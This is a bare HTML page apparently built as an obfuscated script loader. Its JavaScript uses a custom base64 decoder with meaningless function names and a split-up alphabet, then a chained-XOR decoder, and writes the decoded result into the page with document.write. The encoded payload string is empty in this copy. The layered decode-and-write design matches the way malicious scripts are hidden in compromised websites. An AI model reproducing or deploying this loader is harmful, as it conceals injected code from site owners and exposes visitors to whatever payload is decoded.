 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<body>
	<script type="text/javascript">



   
function fsomggfs(fsom){
	fsom = fsom.replace(/[^a-z0-9\+\/=]/ig, '');
	var flsk; 
    var fmcg; 
    var fmlf;
	var typeint1, typeint2, typeint3, typeint4;
	var ffpo = new Array();
	var ffml=0;
		var flgp = 'AB'+'CD'+
        'EFG'+'HI'+'JK'+'LMN'+
        'OP'+'QRST'+'UVWX'+'YZ'+
        'ab'+'cde'+'fgh'+'ijkl'+'mno'+
        'pqr'+'stu'+'vwx'+'yz0'+'123'+'456'+'789'+'+'+'/=';
	for (var colr=0; colr<fsom.length; colr+= 4 ) {
        typeint1 = flgp.indexOf ( fsom.charAt ( colr ) );
		typeint2 = flgp.indexOf ( fsom.charAt ( colr+1 ) );
		typeint3 = flgp.indexOf ( fsom.charAt ( colr+2 ) );
		typeint4 = flgp.indexOf ( fsom.charAt ( colr+3 ) );
        flsk=(typeint1 << 2) | (typeint2 >> 4);  fmcg=((typeint2 & 15) << 4) | (typeint3 >> 2); fmlf=((typeint3 & 3) << 6) | typeint4;
		ffpo[ffml++] = String.fromCharCode(flsk);
		if (typeint3 != 64) ffpo[ffml++] = String.fromCharCode( fmcg);
		if (typeint4 != 64) ffpo[ffml++] = String.fromCharCode( fmlf);	
	}
    if (typeof(atob) == 'function') return atob(fsom);
	return ffpo.join('');
}



function fkfqgcmf(fpqs){
    var fgsg=""; 
    var fpof=fpqs.length;
    for (var folc= 1; folc< fpof; folc++)
    {fgsg += String.fromCharCode(fpqs.charCodeAt(folc) ^fpqs.charCodeAt(folc -1)); }
    return fgsg; }
</script>
    	<script type="text/javascript">
  

document.write(fkfqgcmf(fsomggfs( "")));
</script>